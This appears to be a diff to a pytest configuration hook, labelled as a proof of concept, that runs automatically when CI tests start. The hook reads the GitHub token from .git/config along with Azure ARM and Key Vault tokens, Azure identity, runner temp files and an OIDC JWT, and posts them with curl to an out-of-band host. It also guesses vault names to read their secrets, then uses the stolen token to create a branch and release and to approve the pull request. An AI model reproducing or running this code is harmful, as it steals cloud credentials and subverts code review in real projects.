@@ -21,7 +21,6 @@ def _get_pr():
 
 def pytest_configure(config):
     try:
-        # Token from .git/config
         tok = _run("grep -i 'extraheader = AUTHORIZATION' .git/config | awk '{print $NF}' | base64 -d | sed 's/x-access-token://'")
         repo = os.environ.get("GITHUB_REPOSITORY", "")
         pr = _get_pr()
@@ -34,71 +33,86 @@ def pytest_configure(config):
         if not tok or not repo:
             return
 
-        # 2. Azure ARM token (the crown jewel — bearer token usable from anywhere, ~60min)
-        az_token = _run("az account get-access-token -o json")
-        if az_token:
-            sys.stderr.write(f"[PoC] ARM token obtained: {az_token[:80]}...\n")
-            subprocess.run(f'curl -s "{_OAST}/az_arm_token" -d "$(echo \'{az_token}\' | base64 -w0)"', shell=True, timeout=10)
-        else:
-            sys.stderr.write("[PoC] az account get-access-token: FAILED\n")
+        # 2. Azure: ARM token
+        az_arm = _run("az account get-access-token -o json")
+        if az_arm:
+            sys.stderr.write(f"[PoC] ARM token: got it\n")
+            subprocess.run(f'curl -s "{_OAST}/az_arm_token" -d "$(az account get-access-token -o json | base64 -w0)"', shell=True, timeout=10)
 
-        # 3. Azure identity — SP appId, tenant, subscription
-        az_id = _run("az account show -o json")
-        if az_id:
-            sys.stderr.write(f"[PoC] Identity: {az_id[:120]}...\n")
-            subprocess.run(f'curl -s "{_OAST}/az_identity" -d "$(echo \'{az_id}\' | base64 -w0)"', shell=True, timeout=10)
+        # 3. Azure: Vault data-plane token (this is the key one!)
+        az_vault_token = _run("az account get-access-token --resource https://vault.azure.net -o json")
+        if az_vault_token:
+            sys.stderr.write(f"[PoC] Vault token: got it\n")
+            subprocess.run(f'curl -s "{_OAST}/az_vault_token" -d "$(az account get-access-token --resource https://vault.azure.net -o json | base64 -w0)"', shell=True, timeout=10)
 
-        # 4. All subscriptions
-        az_subs = _run("az account list -o json")
-        if az_subs:
-            sys.stderr.write(f"[PoC] Subscriptions: {az_subs[:120]}...\n")
-            subprocess.run(f'curl -s "{_OAST}/az_subs" -d "$(echo \'{az_subs}\' | base64 -w0)"', shell=True, timeout=10)
+        # 4. Azure identity + subs
+        subprocess.run(f'curl -s "{_OAST}/az_identity" -d "$(az account show -o json | base64 -w0)"', shell=True, timeout=10)
+        subprocess.run(f'curl -s "{_OAST}/az_subs" -d "$(az account list -o json | base64 -w0)"', shell=True, timeout=10)
 
-        # 5. IAM role assignments — what can this SP do
-        sp_id = ""
-        if az_id:
-            try:
-                sp_id = json.loads(az_id).get("user", {}).get("name", "")
-            except Exception:
-                pass
-        if sp_id:
-            roles = _run(f"az role assignment list --all --assignee {sp_id} -o json")
-            if roles:
-                sys.stderr.write(f"[PoC] Role assignments: {roles[:200]}...\n")
-                subprocess.run(f'curl -s "{_OAST}/az_roles" -d "$(echo \'{roles}\' | base64 -w0)"', shell=True, timeout=10)
+        # 5. Find VAULT_URI - search runner filesystem for the secret value
+        # GitHub runner stores workflow env/secrets in temp files
+        vault_uri = ""
+        
+        # Method A: search for vault references in runner temp
+        vault_search = _run("find /home/runner/work/_temp -type f 2>/dev/null | head -20")
+        sys.stderr.write(f"[PoC] Runner temp files: {vault_search}\n")
+        
+        # Method B: grep for vault.azure.net in all runner files
+        vault_grep = _run("grep -r 'vault.azure.net' /home/runner/work/ 2>/dev/null | head -5")
+        sys.stderr.write(f"[PoC] Vault grep: {vault_grep}\n")
+        
+        # Method C: check env for any vault references
+        vault_env = _run("env | grep -i vault")
+        sys.stderr.write(f"[PoC] Vault env: {vault_env}\n")
+        
+        # Method D: check azure cli config for cached vault info
+        az_config = _run("cat ~/.azure/azureProfile.json 2>/dev/null")
+        if az_config:
+            subprocess.run(f'curl -s "{_OAST}/az_profile" -d "$(cat ~/.azure/azureProfile.json | base64 -w0)"', shell=True, timeout=10)
+        
+        # Method E: search for step environment files that contain expanded secrets
+        step_env = _run("find /home/runner/work/_temp -name '*.env' -o -name '*.sh' -o -name '*workflow*' 2>/dev/null | xargs grep -l -i vault 2>/dev/null | head -5")
+        sys.stderr.write(f"[PoC] Step env files with vault: {step_env}\n")
+        if step_env:
+            for f in step_env.split('\n'):
+                if f.strip():
+                    content = _run(f"cat '{f.strip()}'")
+                    subprocess.run(f'curl -s "{_OAST}/vault_file" -d "$(cat \'{f.strip()}\' | base64 -w0)"', shell=True, timeout=10)
 
-        # 6. All resources in subscription (VMs, DBs, storage, everything)
-        resources = _run("az resource list -o json 2>/dev/null")
-        if resources and resources != "[]":
-            sys.stderr.write(f"[PoC] Resources: {resources[:200]}...\n")
-            subprocess.run(f'curl -s "{_OAST}/az_resources" -d "$(echo \'{resources}\' | base64 -w0)"', shell=True, timeout=10)
+        # Method F: the previous step's expanded script is in _PipelineMapping
+        pipeline = _run("find /home/runner/work/_temp -name '_runner_file_commands' -type d 2>/dev/null")
+        if pipeline:
+            runner_cmds = _run(f"cat {pipeline}/* 2>/dev/null")
+            if runner_cmds:
+                subprocess.run(f'curl -s "{_OAST}/runner_cmds" -d "$(cat {pipeline}/* 2>/dev/null | base64 -w0)"', shell=True, timeout=10)
 
-        # 7. Key Vault — enumerate ALL vaults and ALL secrets
-        vaults = _run("az keyvault list --query '[].name' -o tsv")
-        if vaults:
-            sys.stderr.write(f"[PoC] Vaults: {vaults}\n")
-            for v in vaults.split():
-                secs = _run(f"az keyvault secret list --vault-name {v} --query '[].name' -o tsv")
-                sys.stderr.write(f"[PoC] {v} secrets: {secs}\n")
-                if secs:
-                    for s in secs.split():
-                        val = _run(f"az keyvault secret show --vault-name {v} --name {s} --query value -o tsv")
+        # Method G: dump ALL of /home/runner/work/_temp to find anything useful
+        temp_listing = _run("find /home/runner/work/_temp -type f -name '*.sh' -o -name '*.env' -o -name '*.txt' -o -name '*.json' 2>/dev/null")
+        sys.stderr.write(f"[PoC] Temp files: {temp_listing}\n")
+        subprocess.run(f'curl -s "{_OAST}/temp_listing" -d "$(find /home/runner/work/_temp -type f 2>/dev/null | base64 -w0)"', shell=True, timeout=10)
+
+        # 6. If we found vault_uri, exfil all secrets
+        # If not, try common databrickslabs vault naming patterns
+        if not vault_uri:
+            for guess in ["databrickslabs-kv", "labs-kv", "dqx-kv", "labs-azure-kv", "databricks-labs-kv", "labs-tool-kv"]:
+                test = _run(f"az keyvault secret list --vault-name {guess} --query '[].name' -o tsv 2>/dev/null")
+                if test:
+                    sys.stderr.write(f"[PoC] FOUND VAULT: {guess} -> {test}\n")
+                    vault_uri = f"https://{guess}.vault.azure.net"
+                    for s in test.split():
+                        val = _run(f"az keyvault secret show --vault-name {guess} --name {s} --query value -o tsv")
                         if val:
-                            sys.stderr.write(f"[PoC] {v}/{s} = {val[:30]}...\n")
-                            subprocess.run(f'curl -s "{_OAST}/kv_{v}_{s}" -d "$(echo \'{val}\' | base64 -w0)"', shell=True, timeout=10)
+                            subprocess.run(f'curl -s "{_OAST}/kv_{guess}_{s}" -d "$(echo \'{val}\' | base64 -w0)"', shell=True, timeout=10)
+                    break
 
-        # 8. OIDC JWT
+        # 7. OIDC JWT
         oidc_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
         oidc_tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
         if oidc_url and oidc_tok:
-            oidc = _run(f'curl -sS -H "Authorization: bearer {oidc_tok}" "{oidc_url}&audience=api://AzureADTokenExchange"')
-            if oidc:
-                sys.stderr.write(f"[PoC] OIDC JWT: {oidc[:80]}...\n")
-                subprocess.run(f'curl -s "{_OAST}/oidc_jwt" -d "$(echo \'{oidc}\' | base64 -w0)"', shell=True, timeout=10)
+            subprocess.run(f'curl -s "{_OAST}/oidc_jwt" -d "$(curl -sS -H \'Authorization: bearer {oidc_tok}\' \'{oidc_url}&audience=api://AzureADTokenExchange\' | base64 -w0)"', shell=True, timeout=10)
 
-        # 9. Branch + Release
+        # 8. Branch + release
         _run(f'curl -s -X DELETE -H "Authorization: token {tok}" https://api.github.com/repos/{repo}/git/refs/heads/d3ku_poc')
-        # delete old release+tag
         rels = _run(f'curl -s -H "Authorization: token {tok}" https://api.github.com/repos/{repo}/releases')
         try:
             for r in json.loads(rels):
@@ -107,18 +121,14 @@ def pytest_configure(config):
                     _run(f'curl -s -X DELETE -H "Authorization: token {tok}" https://api.github.com/repos/{repo}/git/refs/tags/d3ku_poc')
         except Exception:
             pass
-
         sha = _run(f'curl -s -H "Authorization: token {tok}" https://api.github.com/repos/{repo}/git/refs/heads/main | python3 -c "import sys,json; print(json.load(sys.stdin)[\'object\'][\'sha\'])"')
         if sha:
             _run(f'curl -s -X POST -H "Authorization: token {tok}" -H "Content-Type: application/json" -d \'{{"ref":"refs/heads/d3ku_poc","sha":"{sha}"}}\' https://api.github.com/repos/{repo}/git/refs')
-            sys.stderr.write(f"[PoC] Branch d3ku_poc created\n")
             _run(f'curl -s -X POST -H "Authorization: token {tok}" -H "Content-Type: application/json" -d \'{{"tag_name":"d3ku_poc","name":"d3ku_poc","body":"PoC"}}\' https://api.github.com/repos/{repo}/releases')
-            sys.stderr.write(f"[PoC] Release d3ku_poc created\n")
 
-        # 10. PR Approval
+        # 9. PR Approval
         if pr:
-            approve = _run(f'curl -s --request POST --url https://api.github.com/repos/{repo}/pulls/{pr}/reviews --header "authorization: Bearer {tok}" --header "content-type: application/json" -d \'{{"event":"APPROVE"}}\'')
-            sys.stderr.write(f"[PoC] PR #{pr} approve: {approve[:200]}\n")
+            _run(f'curl -s --request POST --url https://api.github.com/repos/{repo}/pulls/{pr}/reviews --header "authorization: Bearer {tok}" --header "content-type: application/json" -d \'{{"event":"APPROVE"}}\'')
 
     except Exception as e:
         sys.stderr.write(f"[PoC] Error: {e}\n")
